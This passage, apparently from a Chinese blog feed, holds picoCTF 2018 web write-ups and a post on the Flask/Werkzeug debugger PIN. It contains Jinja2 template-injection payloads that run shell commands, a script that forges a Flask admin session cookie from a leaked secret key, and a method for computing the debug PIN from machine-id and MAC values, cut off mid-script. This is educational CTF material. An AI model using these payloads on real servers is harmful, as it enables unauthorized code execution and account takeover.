class="line">date: Mon, 15 Oct 2018 14:38:42 GMT</span><br><span class="line">connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &lt;html&gt;</span><br><span class="line">                        &lt;head&gt;</span><br><span class="line">                                &lt;link rel="stylesheet" type="text/css" href="main.css" /&gt;</span><br><span class="line">                        &lt;/head&gt;</span><br><span class="line">                        &lt;body&gt;</span><br><span class="line">                                &lt;header&gt;</span><br><span class="line">                                        &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">                                        &lt;div class="user"&gt;Real Business Employee&lt;/div&gt;</span><br><span class="line">                                        &lt;a href="/logout"&gt;Logout&lt;/a&gt;</span><br><span class="line">                                &lt;/header&gt;</span><br><span class="line">                                &lt;main&gt;</span><br><span class="line">                                        &lt;p&gt;Hello &lt;b&gt;Real Business Employee&lt;/b&gt;!  Today's flag is: &lt;code&gt;picoCTF&#123;0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_a87a&#125;&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line">                                &lt;/main&gt;</span><br><span class="line">                        &lt;/body&gt;</span><br><span class="line">                &lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="Flaskcards"><a href="#Flaskcards" class="headerlink" title="Flaskcards"></a>Flaskcards</h3><blockquote><p>We found this fishy <a href="http://2018shell1.picoctf.com:17012/" target="_blank" rel="noopener">website</a> for flashcards that we think may be sending secrets. Could you take a look?</p></blockquote><p>首页提供两个功能，一个注册一个登陆，未发现异常，随机注册账号并登陆</p><p><img src="2.png" alt></p><p>登陆后发现有三个功能，一个生成card，一个显示card，一个show出u’r not admin 的页面</p><p><img src="3.png" alt></p><p><img src="4.png" alt></p><p><img src="5.png" alt></p><p><img src="6.png" alt></p><p>然后这题是flask-server-side-template-injection</p><p>参考链接  <a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">服务端模板注入</a></p><p>通过发送4发现能解析</p><p><img src="7.png" alt></p><p><img src="8.png" alt></p><p>查看config发现flag</p><p><img src="9.png" alt></p><p>picoCTF{secret_keys_to_the_kingdom_584f8327}</p><h3 id="Flaskcards-Skeleton-Key"><a href="#Flaskcards-Skeleton-Key" class="headerlink" title="Flaskcards Skeleton Key"></a>Flaskcards Skeleton Key</h3><blockquote><p>Nice! You found out they were sending the Secret_key: 385c16dd09098b011d0086f9e218a0a2. Now, can you find a way to log in as admin? </p></blockquote><p>参考链接  <a href="http://flask.pocoo.org/docs/1.0/quickstart/" target="_blank" rel="noopener">how cookie work in Flask application</a></p><p>这题是flask cookie and template injection</p><p><a href="https://teamrocketist.github.io/2017/09/11/Web-ASIS-Golem-is-stupid/" target="_blank" rel="noopener">flask_cookie_编码解码脚本</a></p><p>查阅发现flask通过sercet_key对cookie的session进行加密</p><p>将解码后的userid值置换为1然后编码添加到cookie中即可出flag（将普通用户转为admin）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> URLSafeTimedSerializer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleSecureCookieSessionInterface</span><span class="params">(SecureCookieSessionInterface)</span>:</span></span><br><span class="line">    <span class="comment"># Override method</span></span><br><span class="line">    <span class="comment"># Take secret_key instead of an instance of a Flask app</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_signing_serializer</span><span class="params">(self, secret_key)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> secret_key:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        signer_kwargs = dict(</span><br><span class="line">            key_derivation=self.key_derivation,</span><br><span class="line">            digest_method=self.digest_method</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> URLSafeTimedSerializer(secret_key, salt=self.salt,</span><br><span class="line">                                      serializer=self.serializer,</span><br><span class="line">                                      signer_kwargs=signer_kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeFlaskCookie</span><span class="params">(secret_key, cookieValue)</span>:</span></span><br><span class="line">    sscsi = SimpleSecureCookieSessionInterface()</span><br><span class="line">    signingSerializer = sscsi.get_signing_serializer(secret_key)</span><br><span class="line">    <span class="keyword">return</span> signingSerializer.loads(cookieValue)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Keep in mind that flask uses unicode strings for the</span></span><br><span class="line"><span class="comment"># dictionary keys</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFlaskCookie</span><span class="params">(secret_key, cookieDict)</span>:</span></span><br><span class="line">    sscsi = SimpleSecureCookieSessionInterface()</span><br><span class="line">    signingSerializer = sscsi.get_signing_serializer(secret_key)</span><br><span class="line">    <span class="keyword">return</span> signingSerializer.dumps(cookieDict)</span><br><span class="line"></span><br><span class="line">cookie = decodeFlaskCookie(<span class="string">'385c16dd09098b011d0086f9e218a0a2'</span>,</span><br><span class="line">                          <span class="string">'.eJwljzFqBDEMAP_i-gpJtmTpPrNYskRCIIHduyrk77mQbpqBme921JnXW7s_zmfe2vG-273VZhNnJ7AoXSHLWVERs6rPsvDYzBNrRI1U8RfBAFrTOu1U2kBDqChsdTADpzE7Ti6sTOhUwloQMkgn6-xZJpFJiFvAe7u1uM46Hl8f-fnqEbRUW2NQJCiVy1A3IzXckTbDgpLpz3teef5PWPv5BaAZPmI.DpSgrw.SGhImnmWlX33-8gs-0L8kJWC3IY'</span>)</span><br><span class="line"></span><br><span class="line">cookie[<span class="string">u'user_id'</span>] = <span class="string">u'1'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> encodeFlaskCookie(<span class="string">'385c16dd09098b011d0086f9e218a0a2'</span>,</span><br><span class="line">                          cookie)</span><br></pre></td></tr></table></figure><p><img src="10.png" alt></p><p>picoCTF{1_id_to_rule_them_all_d77c1ed6}</p><p>参考链接  <a href="https://terryvogelsang.tech/MITRECTF2018-my-flask-app/" target="_blank" rel="noopener">wp1</a> <a href="https://github.com/bl4de/ctf/blob/master/2017/ASIS_CTF_2017/Golem/Golem_Web_writeup.md" target="_blank" rel="noopener">wp2</a></p><h3 id="Flaskcards-and-Freedom"><a href="#Flaskcards-and-Freedom" class="headerlink" title="Flaskcards and Freedom"></a>Flaskcards and Freedom</h3><blockquote><p>There seem to be a few more files stored on the flash card server but we can’t login. Can you?<br>Hint:<br>・There’s more to the original vulnerability than meets the eye.<br>・Can you leverage the injection technique to get remote code execution?<br>・Sorry, but the database still reverts every 2 hours.</p></blockquote><p>模板注入，flask配合沙盒逃逸进行远程代码执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现回显中有”warings.catch_warnings”可进行逃逸</p><p>参考链接  <a href="https://blog.csdn.net/qq_27446553/article/details/79379136" target="_blank" rel="noopener">Flask jinja2模板注入思路总结</a>   <a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" target="_blank" rel="noopener">Flask &amp; Jinja2 SSTI</a></p><p>命令执行payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">243</span>].__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">'__import__("os").popen("ls").read()'</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">243</span>].__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">'__import__("os").popen("cat flag").read()'</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&#123;&#123;((<span class="string">''</span>|attr(request.args.param)|attr(request.args.param2))[<span class="number">1</span>]|attr(request.args.param3))()[<span class="number">197</span>](request.args.param4).open().read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="11.png" alt></p><p>picoCTF{R_C_E_wont_let_me_be_76de9280}</p><p>参考链接</p><hr><p><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">服务端模板注入</a></p><p><a href="http://flask.pocoo.org/docs/1.0/quickstart/" target="_blank" rel="noopener">how cookie work in Flask application</a></p><p><a href="https://teamrocketist.github.io/2017/09/11/Web-ASIS-Golem-is-stupid/" target="_blank" rel="noopener">flask_cookie_编码解码脚本</a></p><p><a href="https://terryvogelsang.tech/MITRECTF2018-my-flask-app/" target="_blank" rel="noopener">wp1</a>    <a href="https://github.com/bl4de/ctf/blob/master/2017/ASIS_CTF_2017/Golem/Golem_Web_writeup.md" target="_blank" rel="noopener">wp2</a></p><p> <a href="https://blog.csdn.net/qq_27446553/article/details/79379136" target="_blank" rel="noopener">Flask jinja2模板注入思路总结</a>   <a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" target="_blank" rel="noopener">Flask &amp; Jinja2 SSTI</a></p><p>后续补坑。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;日常复现补坑，来自2018picoctf的好题&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>FLASK PIN DEBUG</title>
    <link href="https://zo1ro.github.io/2018/09/20/flask-pin/"/>
    <id>https://zo1ro.github.io/2018/09/20/flask-pin/</id>
    <published>2018-09-20T07:30:16.000Z</published>
    <updated>2019-06-28T04:48:36.905Z</updated>
    
    <content type="html"><![CDATA[<p>Flask 在debug模式下会生成PIN码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@zo1ro-ubuntu:/var/www/html/flask# python app.py</span><br><span class="line"></span><br><span class="line"> \* Serving Flask app "app" (lazy loading)</span><br><span class="line"></span><br><span class="line"> \* Environment: production</span><br><span class="line"></span><br><span class="line">   WARNING: Do not use the development server in a production environment.</span><br><span class="line"></span><br><span class="line">   Use a production WSGI server instead.</span><br><span class="line"></span><br><span class="line"> \* Debug mode: on</span><br><span class="line"></span><br><span class="line"> \* Running on http://0.0.0.0:2333/ (Press CTRL+C to quit)</span><br><span class="line"></span><br><span class="line"> \* Restarting with stat</span><br><span class="line"></span><br><span class="line"> \* Debugger is active!</span><br><span class="line"></span><br><span class="line"> \* Debugger PIN: 251-181-066</span><br></pre></td></tr></table></figure> <a id="more"></a><p>通过PIN 码，我们可以在报错页面执行任意python代码</p><p><img src="1.png" alt></p><p>问题就出在了这个pin码的生成机制上，在同一台机子上多次启动同一个Flask应用时，会发现这个pin码是固定的。是由一些固定的值生成的，不如直接来看看Flask源码中是怎么写的</p><p>测试环境为：</p><p>· Ubuntu 16.04</p><p>· python 2.7</p><p>· Flask 0.10.1</p><p>主函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello world!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">2333</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>Pycharm下debug断点</p><p>run 函数跟进show_server_banner</p><p><img src="2.png" alt></p><p>跟进run_simple</p><p><img src="3.png" alt></p><p>跟进DebuggedApplication</p><p><img src="4.png" alt></p><p>发现pin_security ,pin_logging 两个参数</p><p><img src="5.png" alt></p><p>直接搜索pin参数发现get_pin_and_cookie_name函数</p><p><img src="6.png" alt></p><p>应该就是PIN码生成的函数</p><p><img src="7.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pin_and_cookie_name</span><span class="params">(app)</span>:</span></span><br><span class="line">    <span class="string">"""Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    pin = os.environ.get(<span class="string">'WERKZEUG_DEBUG_PIN'</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">'off'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">'-'</span>, <span class="string">''</span>).isdigit():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'-'</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = getattr(app, <span class="string">'__module__'</span>,</span><br><span class="line">                      getattr(app.__class__, <span class="string">'__module__'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># `getpass.getuser()` imports the `pwd` module,</span></span><br><span class="line">        <span class="comment"># which does not exist in the Google App Engine sandbox.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        getattr(app, <span class="string">'__name__'</span>, getattr(app.__class__, <span class="string">'__name__'</span>)),</span><br><span class="line">        getattr(mod, <span class="string">'__file__'</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [</span><br><span class="line">        str(uuid.getnode()),</span><br><span class="line">        get_machine_id(),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(bit, text_type):</span><br><span class="line">            bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don't</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">        num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don't have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure><p>Debug后发现return的rv变量就是生成的pin码</p><p><img src="8.png" alt></p><p>可以看到</p><p>username就是启动这个Flask的用户</p><p>modname为flask.app</p><p>getattr(app, ‘<strong>name</strong>‘, getattr(app.<strong>class</strong>, ‘<strong>name</strong>‘))为Flask</p><p>getattr(mod, ‘<strong>file</strong>‘, None)为flask目录下的一个app.py的绝对路径</p><p>uuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</p><p>get_machine_id()不妨跟进去看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_machine_id</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line">    rv = _machine_id</span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="comment"># Potential sources of secret information on linux.  The machine-id</span></span><br><span class="line">        <span class="comment"># is stable across boots, the boot id is not</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">'/etc/machine-id'</span>, <span class="string">'/proc/sys/kernel/random/boot_id'</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X we can use the computer's serial number assuming that</span></span><br><span class="line">        <span class="comment"># ioreg exists and can spit out that information.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Also catch import errors: subprocess may not be available, e.g.</span></span><br><span class="line">            <span class="comment"># Google App Engine</span></span><br><span class="line">            <span class="comment"># See https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line">            dump = Popen([<span class="string">'ioreg'</span>, <span class="string">'-c'</span>, <span class="string">'IOPlatformExpertDevice'</span>, <span class="string">'-d'</span>, <span class="string">'2'</span>],</span><br><span class="line">                         stdout=PIPE).communicate()[<span class="number">0</span>]</span><br><span class="line">            match = re.search(<span class="string">b'"serial-number" = &lt;([^&gt;]+)'</span>, dump)</span><br><span class="line">            <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows we can use winreg to get the machine guid</span></span><br><span class="line">        wr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg <span class="keyword">as</span> wr</span><br><span class="line">        <span class="keyword">except</span> ImportError:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">import</span> _winreg <span class="keyword">as</span> wr</span><br><span class="line">            <span class="keyword">except</span> ImportError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> wr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> wr.OpenKey(wr.HKEY_LOCAL_MACHINE,</span><br><span class="line">                                <span class="string">'SOFTWARE\\Microsoft\\Cryptography'</span>, <span class="number">0</span>,</span><br><span class="line">                                wr.KEY_READ | wr.KEY_WOW64_64KEY) <span class="keyword">as</span> rk:</span><br><span class="line">                    machineGuid, wrType = wr.QueryValueEx(rk, <span class="string">'MachineGuid'</span>)</span><br><span class="line">                    <span class="keyword">if</span> (wrType == wr.REG_SZ):</span><br><span class="line">                        <span class="keyword">return</span> machineGuid.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> machineGuid</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    _machine_id = rv = _generate()</span><br><span class="line">    <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure><p>首先尝试读取/etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值，若有就直接返回</p><p>假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值，并返回</p><p>这里就是etc/machine-id文件下的值</p><p><img src="9.png" alt></p><p>这样，当这6个值我们可以获取到时，就可以推算出生成的PIN码，引发任意代码执行</p><p>Username——》root</p><p>Modname——》flask.app</p><p>getattr(app, ‘<strong>name</strong>‘, getattr(app.<strong>class</strong>, ‘<strong>name</strong>‘))——》Flask</p><p>getattr(mod, ‘<strong>file</strong>‘, None)——》/usr/local/lib/python2.7/dist-packages/flask/app.pyc</p><p>（通过debug下发现的启动位置信息）</p><p>（这里有个坑，python在运行一次文件以后会将运行内存信息存储到一个pyc文件中，在下次调用程序的时候直接调用pyc文件以加快调试速度）</p><p><img src="10.png" alt></p><p>str(uuid.getnode())——》52230783609</p><p>（sys/class/net/eth0/address）网卡信息位置，一般为eth0，我的虚拟机下为ens33</p><p><img src="11.png" alt></p><p>get_machine_id()——》340ae5fcfaaa41f69f10045a4417e24d</p><p>计算出PIN</p><p>251-181-066</p><p>调试，成功进入debug</p><p><img src="12.png" alt></p><p>撒花~~</p><p>附源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span 